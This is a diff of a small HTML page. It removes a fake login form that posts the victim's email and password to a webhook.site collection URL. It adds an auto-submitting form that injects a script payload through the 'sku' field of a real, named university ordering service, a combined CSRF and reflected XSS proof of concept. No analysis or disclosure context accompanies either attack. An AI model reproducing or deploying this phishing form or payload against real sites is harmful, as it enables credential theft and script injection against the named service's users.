@@ -1,21 +1,9 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>Login</title>
-</head>
 <body>
-
-<h2>Login</h2>
-
-<form action="https://webhook.site/f7ec4a70-790b-4857-9102-38d693d49111" method="POST">
-    <label>Email</label><br>
-    <input type="email" name="email" required><br><br>
-
-    <label>Password</label><br>
-    <input type="password" name="password" required><br><br>
-
-    <button type="submit">Login</button>
+<form id="xss" method="POST" action="https://bestellservice.studierendenwerk-koblenz.de/quickadd/add/save/">
+  <input type="hidden" name="sku" value='001. A.000"><ScRiPt>alert(document.domain)</ScRiPt>' />
+  <input type="hidden" name="qty" value="1" />
 </form>
-
+<script>document.getElementById("xss").submit();</script>
 </body>
 </html>
